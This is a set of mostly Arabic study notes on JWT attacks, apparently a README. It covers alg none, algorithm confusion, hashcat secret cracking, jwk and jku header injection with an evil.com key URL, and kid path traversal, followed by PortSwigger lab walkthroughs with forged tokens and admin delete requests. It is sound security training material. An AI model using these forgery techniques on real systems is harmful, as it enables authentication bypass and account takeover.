# JWT 


- <details>
    <summary>what is JWT?</summary>
  
  # 🔐 JWT Attacks - مقدمة
  
  ## ما هو JWT؟
  
  -   **JWT = JSON Web Token** → معيار لتمثيل البيانات كـ JSON بين
      الأنظمة.
  -   غالبًا يُستخدم في:
      -   **Authentication** (تأكيد هوية المستخدم)
      -   **Session management** (إدارة الجلسات)
      -   **Access control** (تحديد الصلاحيات)
  
  ------------------------------------------------------------------------
  
  ## بنية JWT
  
  يتكون JWT من **3 أجزاء** مفصولة بنقطة `.`:
  
  1.  **Header** → معلومات عن التوكن (الخوارزمية، النوع).
  2.  **Payload** → البيانات (claims) مثل اسم المستخدم والصلاحيات.
  3.  **Signature** → توقيع يعتمد على مفتاح سري للتحقق من عدم التلاعب.
  
  مثال:
  
      xxxxx.yyyyy.zzzzz
  
  ------------------------------------------------------------------------
  
  ## مثال عملي - Payload
  
  ``` json
  {
      "iss": "portswigger",
      "exp": 1648037164,
      "name": "Carlos Montoya",
      "sub": "carlos",
      "role": "blog_author",
      "email": "carlos@carlos-montoya.net",
      "iat": 1516239022
  }
  ```
  
  ### ملاحظات:
  
  -   **Readable**: أي شخص يقدر يفك البيانات لأنها Base64Url (ليست مشفرة).
  -   **Integrity**: التوقيع هو اللي يمنع التلاعب بالبيانات.
  
  ------------------------------------------------------------------------
  
  ## دور الـ Signature
  
  -   التوقيع يتكون من:
  
          HMACSHA256( base64UrlEncode(header) + "." + base64UrlEncode(payload), secret )
  
  -   عند استلام التوكن، السيرفر يتحقق من صحة التوقيع.
  
  -   أي تعديل في **Header** أو **Payload** يجعل التوقيع غير صالح.
  
  ------------------------------------------------------------------------
  
  ## نصائح عملية
  
  -   جرب على [jwt.io](https://jwt.io) → فك التوكن وشوف التغيير في
      التوقيع.
  -   استخدم أدوات مثل **Burp Suite** أو **jwt_tool** لاختبار ثغرات JWT.
  
  ------------------------------------------------------------------------
  
    
  </details>




- <details>
     <summary>JWT attacks</summary>

  
  # JWT Attacks Notes
  
  ## 1. JWT vs JWS vs JWE
  
  -   **JWT (JSON Web Token)**: مجرد Format قياسي للـ Tokens. ممكن يكون
      Signed أو Encrypted.
  -   **JWS (JSON Web Signature)**: JWT معمول له **توقيع** (Signature)
      باستخدام خوارزمية زي HS256 أو RS256 عشان يضمن سلامة البيانات.
  -   **JWE (JSON Web Encryption)**: JWT معمول له **تشفير** كامل عشان يحمي
      المحتوى من إنه يتشاف.
  
  ------------------------------------------------------------------------
  
  ## 2. كيف تظهر ثغرات JWT؟
  
  -   **ضعف في التحقق من التوقيع**:\
      مثال: السيرفر يقبل الـ "alg": "none" → يعني يعتبر الـ Token صالح من
      غير أي توقيع.
  
  -   **ضعف في اختيار الخوارزمية**:\
      مثلًا السيرفر متوقع RS256 (مفتاح عام/خاص) لكن يسمح بالتحويل إلى
      HS256 باستخدام المفتاح العام كـ secret.
  
  -   **تسريب الـ Secret**:\
      لو الـ Secret ضعيف أو متسرب، المهاجم يقدر يولّد توكنات صحيحة.
  
  -   **عدم التحقق من الـ Claims**:
  
      -   تجاهل الـ `exp` → التوكن يفضل صالح بعد انتهاء صلاحيته.
      -   تجاهل الـ `aud` → المهاجم ممكن يستخدم التوكن في تطبيق مختلف.
  
  ------------------------------------------------------------------------
  
  ## 3. Impact (التأثير)
  
  -   انتحال هوية المستخدمين (Authentication Bypass).
  -   سرقة صلاحيات (Privilege Escalation).
  -   وصول إلى بيانات أو عمليات محمية.
  
  ------------------------------------------------------------------------
  
  ## 4. مثال على JWT
  
  Header:
  
  ``` json
  {
    "alg": "HS256",
    "typ": "JWT"
  }
  ```
  
  Payload:
  
  ``` json
  {
    "sub": "1234567890",
    "name": "Alice",
    "admin": true,
    "exp": 1724252214
  }
  ```
  
  Signature:
  
      HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
  
  ------------------------------------------------------------------------
  
  ## 5. أمثلة على الهجوم
  
  ### 5.1 Algorithm None Attack
  
  ``` json
  {
    "alg": "none",
    "typ": "JWT"
  }
  ```
  
  → السيرفر يقبل التوكن بدون توقيع.
  
  ### 5.2 RS256 to HS256 Attack
  
  -   السيرفر متوقع RS256 (مفتاح عام/خاص).\
  -   المهاجم يغيرها إلى HS256 ويستخدم المفتاح **العام** كـ secret لتوليد
      توقيع صحيح.
  
  ------------------------------------------------------------------------
  
  # ✅ الخلاصة
  
  -   دايمًا تحقق من صحة الخوارزمية.
  -   لا تستخدم `none` algorithm.
  -   استخدم Secrets قوية أو مفاتيح صحيحة.
  -   راقب وصحّح Claims زي `exp`, `aud`, `iss`.
  
  

  </details>




- <details>
    <summary>JWT Attacks - Brute-forcing Secret Keys</summary>
    
    # JWT Attacks - Brute-forcing Secret Keys
    
    ## الفكرة الأساسية
    - بعض خوارزميات التوقيع مثل **HS256 (HMAC + SHA-256)** تعتمد على **secret key** (سلسلة نصية عشوائية).
    - لو الـ secret ضعيف أو قابل للتخمين (زي كلمة مرور ضعيفة)، المهاجم يقدر يعمل:
      - إنشاء JWT بأي header و payload.
      - إعادة التوقيع باستخدام الـ secret المخمَّن.
      - الحصول على توقيع صحيح وبالتالي تزوير الـ JWT.
    
    ---
    
    ## أخطاء شائعة من المطورين
    - نسيان تغيير الـ default/placeholder secret.
    - نسخ كود من الإنترنت ونسيان تعديل الـ hardcoded secret.
    - استخدام أسرار ضعيفة أو مشهورة.
    
    ---
    
    ## أداة Brute-force: Hashcat
    - **Hashcat** بيستخدم لمهاجمة مفاتيح JWT بسرعة.
    - موجود مسبقًا في **Kali Linux**.
    - لازم يكون عندك:
      - JWT صالح (موقَّع من السيرفر).
      - wordlist فيها أسرار معروفة.
    
    ---
    
    ## الأمر المستخدم
    ```bash
    hashcat -a 0 -m 16500 <jwt> <wordlist>
    ```

    https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
    
    - ``-a 0`` → هجوم dictionary.
    
    - ``-m 16500`` → مود JWT HS256.
    
    - ``<jwt>`` → التوكن الهدف.
    
    - ``<wordlist>`` → قائمة .
    
    
    #### النتيجة
    
    > Hashcat بيجرب كل secret من الـ wordlist.
    
    لو لقى مطابقة، هيطبع بالشكل:
    
    ```ruby
    <jwt>:<identified-secret>
    ```
    
    لو شغلت الأمر أكتر من مرة، لازم تضيف:
    
    ```
    --show
    ```
    
    
    ```
    hashcat -a 0 -m 16500 <jwt> /usr/share/seclists/Passwords/JWT/jwt.secrets.list
    ```
    ---
    
    <details>
    
    ```
    python3 jwt_tool.py <jwt> -S hs256 -k <secret>
    ```
    
    ```python
    import jwt
    
    payload = {"username": "attacker", "role": "admin"}
    secret = "the_secret_you_found"
    
    token = jwt.encode(payload, secret, algorithm="HS256")
    print(token)
    ```
    
    
    
        
    </details>


  </details>






- <details>
    <summary>JWT header parameter injections</summary>

    # JWT Header Injection - JWK Parameter Exploit
    
    ## 📌 الفكرة العامة
    الـ **JWT** بيتكون من:
    1. **Header** → بيحتوي على معلومات زى `alg` (الخوارزمية) و ممكن كمان يحتوي على حاجات إضافية زى `kid`, `jwk`, `jku`.
    2. **Payload** → البيانات (claims).
    3. **Signature** → توقيع بيتعمل باستخدام secret أو مفتاح خاص (private key).
    
    السيرفر لما يستقبل الـ JWT بيستخدم الـ **Header** عشان يعرف:
    - أى خوارزمية تستخدم للتأكد من التوقيع (`HS256` / `RS256`).
    - أى مفتاح يجيب ويستخدم (من الـ `kid` أو `jwk` أو `jku`).
    
    ---
    
    ## 📌 التركيز هنا: `jwk` Injection
    - `jwk` = **JSON Web Key** → عبارة عن **مفتاح عام (Public Key)** مكتوب فى شكل JSON.
    - المفروض السيرفر عنده **قائمة محدودة** من المفاتيح اللى يثق فيها.
    - لكن لو السيرفر **مُسيء التهيئة (Misconfigured)**، ممكن يقبل أى مفتاح عام **موجود داخل التوكن نفسه** 🤦.
    
    ---
    
    ## 📌 إزاى نستغل ده؟
    1. نولد زوج مفاتيح (RSA Public/Private).
       - عندنا المفتاح **الخاص** (Private) → نوقع بيه التوكن.
       - عندنا المفتاح **العام** (Public) → نحطه جوه الهيدر فى باراميتر `jwk`.
    
    2. نعدل الـ Payload (مثلاً نغير `role` من `user` إلى `admin`).
    
    3. نوقع التوكن باستخدام **المفتاح الخاص بتاعنا**.
    
    4. نحط المفتاح العام جوه الهيدر:
       ```json
       {
         "alg": "RS256",
         "typ": "JWT",
         "jwk": {
           "kty": "RSA",
           "e": "AQAB",
           "n": "....",  
           "kid": "myCustomKey"
         }
       }
       ```
    
    5. لو السيرفر بيقبل ده → هيستخدم المفتاح العام اللى إحنا حاطينه ويتأكد من التوقيع، وده هيكون صحيح لأننا وقعنا بالمفتاح الخاص بتاعنا.  
       🔥 وده بيدينا **تحكم كامل فى التوكن**.
    
    ---
    
    ## 📌 الخطوات العملية (مثال باستخدام Burp + JWT Editor Extension)
    1. فى Burp → افتح تبويب **JWT Editor Keys**.
    2. اعمل **Generate RSA Key**.
    3. ابعت الريكوست اللى فيه JWT لـ **Repeater**.
    4. روح على تبويب الـ **JSON Web Token**.
    5. عدل الـ Payload (مثلاً غير `user":"test"` لـ `user":"admin"`).
    6. اضغط **Attack → Embedded JWK**.
    7. اختار المفتاح اللى انت مولده.
    8. ابعت الريكوست الجديد للسيرفر.
       - لو Misconfigured → هيديك access كأنك Admin.
    
    ---
    
    ## 📌 الخلاصة
    - **الـ jwk Injection** = بنخدع السيرفر يخلى باله من المفتاح العام بتاعنا.
    - إحنا نوقع بالتوكن بمفتاحنا الخاص.
    - السيرفر يتأكد باستخدام المفتاح اللى إحنا حطينه → فالتحقق يعدى.
    - النتيجة: نتحكم فى التوكن ونعدل أى Claims (زي role → admin).
    
    
    
    ---
    
    




  </details>
 







- <details>
      <summary>JWT header parameter injections lead to SSRF</summary>

    # Injecting self-signed JWTs via the `jku` parameter
    
    ## الفكرة الأساسية
    الـ JWT (JSON Web Token) أحيانًا بيحتوي في الـ header على باراميتر اسمه `jku`.  
    الـ `jku` ده بيشير إلى **رابط (URL)** بيحتوي على ملف JSON فيه **JWK Set** (مجموعة مفاتيح عامة) واللي السيرفر بيستخدمها للتحقق من التوقيع.
    
    بدل ما المفتاح العام يكون محطوط مباشرة في الـ token (زي ما بيحصل مع `jwk`)، السيرفر بيروح يجيب المفتاح من الرابط اللي في `jku`.
    
    ---
    
    ## JWK Set
    ملف JWK Set هو JSON بيحتوي على Array من المفاتيح العامة (JWKs).  
    مثال:
    
    ```json
    {
        "keys": [
            {
                "kty": "RSA",
                "e": "AQAB",
                "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
                "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
            },
            {
                "kty": "RSA",
                "e": "AQAB",
                "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
                "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
            }
        ]
    }
    ```
    
    ممكن تلاقي السيرفر بيعرض الملف ده في لينك ثابت زي:
    ```
    /.well-known/jwks.json
    ```
    
    ---
    
    ## إزاي ممكن نستغل ده؟
    لو السيرفر بيثق في أي لينك بيتحط في `jku` (من غير فلترة كويسة):
    
    1. نولّد زوج مفاتيح RSA خاص بينا (Private + Public).
    2. نجهّز JWK Set يضم المفتاح **العام** بتاعنا ونرفعه على سيرفر نتحكم فيه (مثلاً `https://evil.com/jwks.json`).
    3. نولّد JWT جديد ونحط في الـ header:
       ```json
       {
         "alg": "RS256",
         "jku": "https://evil.com/jwks.json",
         "kid": "المفتاح_اللي_جهزناه"
       }
       ```
    4. نوقّع التوكن بالمفتاح **الخاص** اللي عندنا.
    5. السيرفر هيروح يجيب المفتاح العام من لينك `jku` اللي إحنا حاطينه (بتاعنا) وبالتالي يصدّق التوكن.
    
    بكده نقدر نزور أي claims جوة التوكن (مثلاً ندي نفسنا role = admin).
    
    ---
    
    ## طرق الحماية
    - السماح بتحميل المفاتيح من دومينات موثوقة فقط (whitelist).
    - تجاهل أي `jku` جاي من المستخدم.
    - التحقق إن الدومين مش متلاعب فيه (ضد SSRF/URL parsing tricks).
    - استخدام certificate pinning بدل ما يعتمد على جلب مفاتيح ديناميكياً.
    
    ---
    
    ## ملخص
    - `jku` = URL بيحتوي على مفاتيح عامة.
    - لو السيرفر مش بيفلتر اللينك → المهاجم ممكن يرفع JWK Set خاص بيه.
    - ده يسمح له يوقّع JWT بالتوكن بتاعه → السيرفر يصدّق إنه valid.
    - النتيجة = **تزوير JWT + تصعيد صلاحيات**.
    
        
  </details>







- <details>
     <summary>JWT kid path traversal</summary>

    # JWT Attack using `kid` Parameter
    
    ## 🔹 الفكرة الأساسية
    - الـ JWT بيكون له **header** (فيه معلومات عن الخوارزمية والـ key).
    - في بعض الأحيان، الـ header يحتوي على **`kid` (Key ID)** → السيرفر بيستخدم القيمة دي عشان يعرف أي مفتاح (key) يستعمل في التوقيع.
    - الطبيعي: السيرفر يجيب المفتاح من database أو JWK Set بناءً على قيمة الـ `kid`.
    
    ---
    
    ## 🔹 نقطة الضعف
    - **الـ `kid` مش محدد له structure** → مجرد string عشوائي بيحدده المبرمج.
    - لو المبرمج عمل lookup للـ key بشكل unsafe (مثلاً يروح يفتح ملف بنفس اسم الـ `kid`)، ممكن المهاجم يستغل ده.
    
    ### مثال
    ```json
    {
      "kid": "../../path/to/file",
      "typ": "JWT",
      "alg": "HS256"
    }
    ```
    - هنا المهاجم بيعمل **Directory Traversal** بالـ `kid`.
    - السيرفر يروح يقرأ أي ملف من الـ filesystem ويستخدمه كـ secret key.
    
    ---
    
    ## 🔹 الهجوم
    لو السيرفر بيقبل **خوارزمية symmetric زي HS256**:
    1. تختار ملف معروف موجود في السيرفر (مثلاً `/dev/null` على Linux).
    2. `/dev/null` → بيكون دايمًا **فاضي** → أي قراءة منه ترجع **string فاضية**.
    3. تعمل sign للـ JWT باستخدام **secret = "" (empty string)**.
    4. السيرفر يقرأ `/dev/null` → يرجع برضه empty string → يظن إن التوقيع صحيح ✅.
    
    ---
    
    ## 🔹 الصعوبة العملية
    - مشكلة: Burp JWT Editor ما بيسمحش تعمل signing بــ empty string.
    - الحل: **استغلال bug** → وقته ممكن تبعت Base64 encoded null byte بدل ما تبعت empty string. ده بيخدع الـ extension ويخلي التوقيع valid.
    
    ---
    
    ## 🔹 الخلاصة
    - أي مكان السيرفر **بيثق في `kid`** من غير validation → ممكن يتحول لسلاح ضد السيرفر.
    - مهاجم يوجّه السيرفر يقرأ ملف ثابت (زي `/dev/null`) أو ملف فيه key معروف → ويوقّع بنفسه JWTs صحيحة.
    - النتيجة: **تخطّي المصادقة (Authentication Bypass)** أو **تزوير الصلاحيات (Privilege Escalation)**.
    
    

  </details>







- <details>
    <summary>JWT Algorithm Confusion Attack</summary>

    
    
    # 🧨 JWT Algorithm Confusion Attack
    
    ## 💡 الفكرة العامة
    - JWT ممكن يتوقع منك تستخدم **خوارزمية معينة** (زي RS256) علشان تعمل توقيع (signature) بالـ **private key** ويتأكد بيها بالسيرفر باستخدام الـ **public key**.  
    - في المقابل، خوارزمية زي **HS256** بتستخدم مفتاح **واحد سري** (symmetric key) في التوقيع والتحقق.  
    
    المشكلة بتيجي لما السيرفر بيكون مبرمج **غلط** ويستخدم نفس الدالة `verify()` اللى بتقرر الخوارزمية بناءً على الـ `alg` جوه الهيدر.  
    
    ---
    
    ## 🧨 إزاي الثغرة بتحصل؟
    1. السيرفر متوقع دايمًا JWT معمول بـ **RS256** → يعني عنده public key ثابت يتحقق بيه.  
    2. الكود بيتعامل مع أي `alg` يلاقيه في الـ JWT header (بدون ما يفلتر).  
    3. المهاجم يغيّر الـ `alg` من `RS256` → `HS256`.  
    4. بدل ما السيرفر يعتبر المفتاح ده **public key لـ RSA**، هيتعامل معاه كأنه **secret key لـ HMAC**.  
    5. المهاجم ببساطة ياخد نفس الـ **public key** (الموجود أساسًا ومتسرب/معروف لأنه Public) ويستخدمه في توقيع التوكن بـ HS256.  
    6. السيرفر هيقبل التوكن الجديد على إنه **سليم وصحيح**! 🎯  
    
    ---
    
    ## 📌 مثال توضيحي
    ### 1. التوكن الأصلي (مفروض RS256):
    ```json
    {
      "alg": "RS256",
      "typ": "JWT"
    }
    ```
    
    ### 2. المهاجم يغيره:
    ```json
    {
      "alg": "HS256",
      "typ": "JWT"
    }
    ```
    
    ### 3. المهاجم يعمل توقيع باستخدام الـ **public key** كأنه secret:
    ```bash
    jwt.encode(payload, public_key, algorithm="HS256")
    ```
    
    ### 4. السيرفر هيتعامل مع نفس الـ public key، بس المرة دي على إنه HMAC secret → فيعدّي التوقيع ✅  
    
    ---
    
    ## 🎯 النتيجة
    المهاجم يقدر يعمل **JWT موقّع بشكل صحيح** من غير ما يكون عنده الـ private key.  
    يعني ممكن يعمل **تزوير لليوزر** (زي admin) ويدخل بالسيستم.  
    
    ---
    
    ## 🛡️ الحماية من الهجوم
    1. السيرفر **لازم يفلتر الـ alg** ويتأكد إنه نفس الخوارزمية المتوقعة (زي RS256 فقط).  
    2. ما ينفعش يعتمد على الهيدر اللى جاي من المستخدم لتحديد نوع التحقق.  
    3. دايمًا اربط التوكن مع خوارزمية محددة في الكود.  
    





    ---
    
    # Algorithm Confusion Attack Walkthrough
    
    ## Step 1 - Obtain the server's public key
    
    -   أحياناً السيرفر بيعرض الـ **Public Key** فى شكل JWK (JSON Web Key)
        عبر endpoint زى:
        -   `/jwks.json`
        -   `/.well-known/jwks.json`
    -   ممكن تلاقيه فى array اسمها `keys`.
    -   مثال:
    
    ``` json
    {
        "keys": [
            {
                "kty": "RSA",
                "e": "AQAB",
                "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
                "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
            }
        ]
    }
    ```
    
    -   حتى لو المفتاح مش ظاهر بشكل علني، ممكن تستخرجه من JWTs موجودة.
    
    ------------------------------------------------------------------------
    
    ## Step 2 - Convert the public key to a suitable format
    
    -   السيرفر بيستخدم نسخة من الـ **public key** من الـ filesystem أو
        database.
    -   علشان الهجوم ينجح لازم المفتاح اللى هتستخدمه يطابق نسخة السيرفر بالـ
        **byte**.
    -   مثال: لو محتاج المفتاح فى **X.509 PEM format**:
        1.  افتح Burp → `JWT Editor Keys` tab.
        2.  اعمل **New RSA Key** وحط الـ JWK.
        3.  اختر **PEM** وانسخ المفتاح.
        4.  روح للـ Decoder tab واعمل Base64 encode.
        5.  ارجع لـ `JWT Editor Keys` → **New Symmetric Key**.
        6.  غير القيمة `k` للـ Base64-encoded PEM.
        7.  احفظ المفتاح.
    
    ------------------------------------------------------------------------
    
    ## Step 3 - Modify your JWT
    
    -   بعد ما جهزت الـ public key بالـ format الصح، عدل الـ JWT payload زى
        ما تحب.
    -   لازم تتأكد إن الـ header فيه: `"alg": "HS256"`.
    
    ------------------------------------------------------------------------
    
    ## Step 4 - Sign the JWT using the public key
    
    -   وقع الـ JWT باستخدام خوارزمية **HS256**.
    -   استعمل الـ **RSA Public Key كأنه secret key**.
    
    





  </details>










- <details>
    <summary>Deriving public keys from existing tokens</summary>





    
    
    # Deriving Public Keys from Existing JWTs
    
    في بعض الأحيان السيرفر مش بيعرض الـ **Public Key** بشكل مباشر، وساعتها ممكن نستغل وجود **زوج من الـ JWTs** عشان نشتق منه القيم الخاصة بالمفتاح.
    
    ---
    
    ## 1. الفكرة العامة
    - أي JWT بيتكون من 3 أجزاء: Header, Payload, Signature.
    - التوقيع Signature بيتعمل باستخدام **Private Key** والسيرفر بيتحقق منه باستخدام **Public Key**.
    - إحنا نقدر نستغل توقيعين (من Token1 و Token2) ونستخرج منهم قيمة اسمها **n** (جزء من الـ RSA Public Key).
    
    ---
    
    ## 2. الأدوات المستخدمة
    - سكربت `jwt_forgery.py` موجود في [rsa_sign2n GitHub repo](https://github.com).
    - نسخة مبسطة متاحة كـ Docker Image.
    
    ### أمر التشغيل:
    ```bash
    docker run --rm -it portswigger/sig2n <token1> <token2>
    ```
    
    > **ملحوظة**: لازم يكون عندك Docker CLI. أول مرة هيعمل Pull للـ Image من Docker Hub، وده ممكن ياخد وقت شوية.
    
    ---
    
    ## 3. مخرجات الأداة
    بعد ما تشغل الأداة بالـ JWTs اللي معاك، هتديك:
    1. **مفاتيح PEM** (Base64-encoded) بصيغتين:
       - X.509
       - PKCS1
    2. **JWTs مزورة** متوقعة وموقعة بالمفاتيح دي.
    
    ---
    
    ## 4. تحديد المفتاح الصحيح
    - خد كل JWT مزور وجرب تبعته من خلال **Burp Repeater**.
    - السيرفر هيقبل واحد منهم بس → وده معناه إن المفتاح المستخدم في التزوير ده هو المفتاح الصحيح.
    - لما تلاقي المفتاح الصح، هتقدر تستخدمه في تنفيذ **Algorithm Confusion Attack**.
    
    ---
    
    ## 5. الخلاصة
    - الهدف: استخراج Public Key حتى لو مش ظاهر.
    - الأدوات: `jwt_forgery.py` أو `docker run portswigger/sig2n`.
    - التجربة: تبعت JWTs مزورة وتشوف أنهي واحد يتقبل.
    - النتيجة: معاك Public Key تقدر بيه تبني هجوم أقوى (زي الـ Algorithm Confusion).
    
    
    



  </details>

















































































----



<details>
  <summary>Lab: JWT authentication bypass via unverified signature</summary>


1. login as **`wiener : peter`**

```http
GET /my-account?id=wiener HTTP/2

Host: 0a560020036c2252813698d200c400be.web-security-academy.net

Cookie: session=eyJraWQiOiI4MWIxYTBiYy01NWNlLTRjOTAtYTE1Yi02ZTY0MzM1MTljNTAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjQyMDU2OCwic3ViIjoid2llbmVyIn0.cLk9QduwU-eyT0xFZwd-BmYuNWJbfadMd_vHQ6IROuHznq-A5R4OvFo7VF_AfDKhOvKCLQxRtEYOdJ-1rGZGkMhYQk36FpGH5m2FTAzqZWT5h2fKiGUhYM8s5p3Pms6R6KNf1vFuKT4yJEs0e-EtpseOIMSQ6wFTpItZz6Pv21abFIETe-pq-2fcgFMfyQs5fzwLbc30IwBhOC-0X1_lJuQiRCXM7Yh3_WbTF5Cw68R5UTaKIIl0SbyKd9rrUCs4dHVZJtQhDLVHsiqUHcJZyewV8PIe8TZHH3Zc0jJYdOEqJck_8EP2Jd8Mrsg1dHMTsQHjgVPODAqz4oc5opnYlw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a560020036c2252813698d200c400be.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers



```

### **`JWT`**

```json
eyJraWQiOiI4MWIxYTBiYy01NWNlLTRjOTAtYTE1Yi02ZTY0MzM1MTljNTAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjQyMDU2OCwic3ViIjoid2llbmVyIn0.cLk9QduwU-eyT0xFZwd-BmYuNWJbfadMd_vHQ6IROuHznq-A5R4OvFo7VF_AfDKhOvKCLQxRtEYOdJ-1rGZGkMhYQk36FpGH5m2FTAzqZWT5h2fKiGUhYM8s5p3Pms6R6KNf1vFuKT4yJEs0e-EtpseOIMSQ6wFTpItZz6Pv21abFIETe-pq-2fcgFMfyQs5fzwLbc30IwBhOC-0X1_lJuQiRCXM7Yh3_WbTF5Cw68R5UTaKIIl0SbyKd9rrUCs4dHVZJtQhDLVHsiqUHcJZyewV8PIe8TZHH3Zc0jJYdOEqJck_8EP2Jd8Mrsg1dHMTsQHjgVPODAqz4oc5opnYlw
```

- <details>
      <summary>jwt.io</summary>
 
     <img width="1183" height="326" alt="image" src="https://github.com/user-attachments/assets/48bc8145-7604-4124-987c-5add5170affa" />

  
   </details>


- <details>
      <summary>JWT editor burp</summary>

    <img width="732" height="713" alt="image" src="https://github.com/user-attachments/assets/9e106d7c-2521-4e54-98c5-3a348e5d417e" />

  
   </details>




<img width="741" height="125" alt="image" src="https://github.com/user-attachments/assets/554d6f72-cedc-4ccd-972f-4f2618b5b91c" />

<img width="1526" height="738" alt="image" src="https://github.com/user-attachments/assets/045c7041-0caf-4d5f-8838-4a11d70e3479" />


> change path to **`/admin`**

<img width="1498" height="657" alt="image" src="https://github.com/user-attachments/assets/24d92751-c0cb-4d14-ba46-0e5338441d7d" />

<img width="1356" height="557" alt="image" src="https://github.com/user-attachments/assets/0c504fb1-c66e-4c15-867b-9cf29892604e" />

<img width="1430" height="491" alt="image" src="https://github.com/user-attachments/assets/1e4b1cdc-88ad-4dd8-9c95-0d9023896589" />




  
</details>



<details>
    <summary>Lab: JWT authentication bypass via flawed signature verification</summary>

1. login as **`wiener : peter`**

<img width="747" height="613" alt="image" src="https://github.com/user-attachments/assets/49400493-6f82-4b6d-84ae-7872076d755e" />

> change **`algo`** to `none` and remove the signeture and change **``carlos``** to **``administrator``**

<img width="1505" height="731" alt="image" src="https://github.com/user-attachments/assets/6a59e0d7-bc8b-4d6c-bb91-b314fa9d88d4" />


> now change **`path`** to :

```http
GET /admin/delete?username=carlos HTTP/2
```

<img width="1505" height="734" alt="image" src="https://github.com/user-attachments/assets/4de7a1c3-ea34-4b8a-9a49-40a2b1d2d401" />

    
</details>







<details>
    <summary>Lab: JWT authentication bypass via weak signing key</summary>


```
eyJraWQiOiIwNjhlY2JkYy00YzQ2LTRlOWItODc5Zi02Y2QyZWVhNjNiZDAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjQyNDM0OCwic3ViIjoid2llbmVyIn0.c0YlOr9HLbE0Xuso36umnu2wiOsGd2BzArlCXI3_60M
```

<img width="742" height="614" alt="image" src="https://github.com/user-attachments/assets/45651d25-d4f7-434e-99d5-9667d0c0bcdb" />


```
hashcat -a 0 -m 16500 eyJraWQiOiIwNjhlY2JkYy00YzQ2LTRlOWItODc5Zi02Y2QyZWVhNjNiZDAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjQyNDM0OCwic3ViIjoid2llbmVyIn0.c0YlOr9HLbE0Xuso36umnu2wiOsGd2BzArlCXI3_60M /usr/share/seclists/Passwords/scraped-JWT-secrets.txt
```

<img width="1374" height="273" alt="image" src="https://github.com/user-attachments/assets/f9e1cded-604e-47a2-834f-157ba0aba4c7" />

```
secret1
```

<img width="1546" height="745" alt="image" src="https://github.com/user-attachments/assets/09176375-61b2-4e35-9181-8eab68b53d87" />

> now change **`path`** to :

```http
GET /admin/delete?username=carlos HTTP/2
```

<img width="1492" height="649" alt="image" src="https://github.com/user-attachments/assets/87127834-aeb3-4d22-b683-7c305bc7849e" />




    
</details>







<details>
    <summary>Lab: JWT authentication bypass via jwk header injection</summary>


```json
eyJraWQiOiJiZjFhOTg1Zi00NDgwLTQ1MmQtODQzZS0wMjIyMGUzZTg2YmYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjQyODc5MSwic3ViIjoid2llbmVyIn0.f2YN61RhTmuZSUdncWJi6PKVky_FYVsWfPW1ue50xJBGExuDmIpl7Ufhy8DlgGN_q2XWI0x5JG85bhoUcLc-8wed0RSPuu0P1C0g-f9naycBtAUDb_wNFCR7WdDSn-L8JJd8UWJS4-XAozvW9EFMk4q5D0YlfsCWPz2oe_JLKlvUug12MN3vRYp_wVgpzumwfAhrMowNNFpBOIjaBxc_hQXMmJ65qnqQD9h2lViue1PAPgXoHmLQUkl9qrvrEMTATCdlgQDFlmPAbgJxn4sVIDtTsi6cxLjaNnpip6fldEyexxSaE3U9x7rnrgTQf0k5vOrpxwtcgp_u1a6dmGPINg
```


<img width="737" height="568" alt="image" src="https://github.com/user-attachments/assets/2e653954-72a1-45bc-9d5f-e9ca6f2923c1" />


---

> genrate ``RSA key``

<img width="798" height="656" alt="image" src="https://github.com/user-attachments/assets/5150b333-3fb7-4639-ab77-3c8bbb26b8fe" />


<img width="742" height="675" alt="image" src="https://github.com/user-attachments/assets/e3a19886-667c-4798-a3dd-2721db6b47fa" />


---

> send the request

<img width="1544" height="635" alt="image" src="https://github.com/user-attachments/assets/4756464e-c1fc-4120-9c2d-b098c596c390" />


----

> now change the path 

```
/admin/delete?username=carlos
```

<img width="1498" height="671" alt="image" src="https://github.com/user-attachments/assets/e2a03383-f021-41df-81e0-ac7105e16b12" />



<details>

## 1. إيه المفروض يحصل (السليم)؟

```


لما السيرفر يستقبل JWT موقّع، لازم يتأكد من التوقيع باستخدام المفتاح الصحيح فقط (secret أو public key اللي هو مبرمج عليه).

المفروض السيرفر مايثقش في أي مفتاح جاي من الكلاينت.
```

---

## 2. الغلط في الـ jwk injection

```


في بعض السيرفرات (لو misconfigured) بيكون الكود مكتوب بحيث يقرأ jwk من الـ JWT نفسه.

يعني السيرفر بدل ما يكون عنده public key ثابت يتحقق بيه، بيقول:
"تمام، الكلاينت بعتلي المفتاح بتاعه في الـ jwk.. هستخدمه للتحقق من التوقيع".

هنا الغلط: السيرفر بيثق في أي RSA key يبعته المهاجم.
```



<img width="1536" height="1024" alt=" Image Aug 29, 2025, 03_05_28 AM" src="https://github.com/user-attachments/assets/069ba80b-1485-41da-a7d8-da7467611bca" />


    
</details>

    
